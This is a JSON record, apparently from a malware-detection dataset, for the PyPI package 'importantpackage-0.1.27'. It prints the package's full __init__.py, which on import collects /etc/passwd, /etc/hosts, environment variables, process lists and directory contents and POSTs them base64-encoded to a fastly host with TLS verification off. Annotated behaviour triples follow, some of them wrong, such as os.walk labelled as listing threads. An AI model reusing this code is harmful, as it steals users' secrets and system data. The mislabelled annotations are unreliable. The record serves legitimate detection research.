{
  "metadata": {
    "package_name": "importantpackage-0.1.27",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/importantpackage-0.1.27.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/importantpackage-0.1.27.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "from urllib import request\nimport json\nimport os\nimport socket\nimport base64\nimport ssl\n\ndef try_call(func, *args):\n    try:\n        return func(*args)\n    except:\n        return 'err'\n\npwd = \"\"\ntry:\n    pwd = '\\n'.join([x for x in open(\"/etc/passwd\")])\nexcept:\n    pass\n\nenv = \"\"\ntry:\n    for a in os.environ:\n        env += \"{}={}\".format(a, os.getenv(a))\nexcept:\n    pass\n\ndirs = \"\"\ntry:\n    dirs = '\\n'.join(os.listdir())\nexcept:\n    pass\n\nlog = \"\"\ntry:\n    log = '\\n'.join([x for x in open(\"logger.py\")])\nexcept:\n    pass\n\nhosts = \"\"\ntry:\n    hosts = '\\n'.join([x for x in open(\"/etc/hosts\")])\nexcept:\n    pass\n\nprocesses  = \"\"\ntry:\n    processes = [(int(p), c) for p, c in [x.rstrip('\\n').split(' ', 1) \\\n        for x in os.popen('ps h -eo pid:1,command')]]\nexcept:\n    pass\n\nallfiles = \"\"\ntry:\n    allfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser(\"~\")) for f in fn]\nexcept:\n    pass\nallfiles = \"\"\n\nraspfiles = \"\"\ntry:\n    raspfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(\"/rasp\") for f in fn]\nexcept:\n    pass\n\ndata = {\n    'host' : try_call(os.uname),\n    'd' : try_call(os.path.expanduser, '~'),\n    'ev' : env,\n    'pwd' : pwd,\n    'dirs' : dirs,\n    'log' : log,\n    'hosts' : hosts,\n    'ps' : processes,\n    'all' : allfiles,\n    'raspfiles' : raspfiles,\n    'c' : try_call(os.getcwd)\n}\ndata = json.dumps(data)\nencoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n\nctx = ssl.create_default_context()\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\n\nr = request.Request('https://fastly.com', data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})\nk = request.urlopen(r, context = ctx)\nprint(k)",
          "triple_sequences": [
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "/etc/passwd",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "os.environ",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "os.environ",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "a",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "logger.py",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "/etc/hosts",
              "object_description": "System hosts configuration",
              "object_id": "system_hosts_config",
              "intention_description": "Access hosts configuration",
              "intention_id": "access_hosts_configuration"
            },
            {
              "action_api": "os.popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "ps h -eo pid:1,command",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Lists all currently alive threads",
              "action_id": "list_threads",
              "object": "os.path.expanduser(\"~\")",
              "object_description": "User home directory",
              "object_id": "user_home_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Lists all currently alive threads",
              "action_id": "list_threads",
              "object": "/rasp",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.uname()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "System info",
              "object_id": "system_info",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "~",
              "object_description": "User home directory",
              "object_id": "user_home_directory",
              "intention_description": "Get user home directory",
              "intention_id": "get_user_home_directory"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "data",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "\"utf-8\"",
              "object_description": "Encoding format",
              "object_id": "encoding_format",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "base64.urlsafe_b64encode()",
              "action_description": "Encodes bytes to base64-encoded bytes",
              "action_id": "encode_bytes_to_base64",
              "object": "data.encode(\"utf-8\")",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare base64-encoded data for transmission",
              "intention_id": "prepare_base64_data_transmission"
            },
            {
              "action_api": "ssl.create_default_context()",
              "action_description": "Creates SSL context with specified protocol",
              "action_id": "create_ssl_context",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "'https://fastly.com', data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'}",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "request.urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "r, context = ctx",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "print()",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "k",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            }
          ]
        }
      ]
    }
  ]
}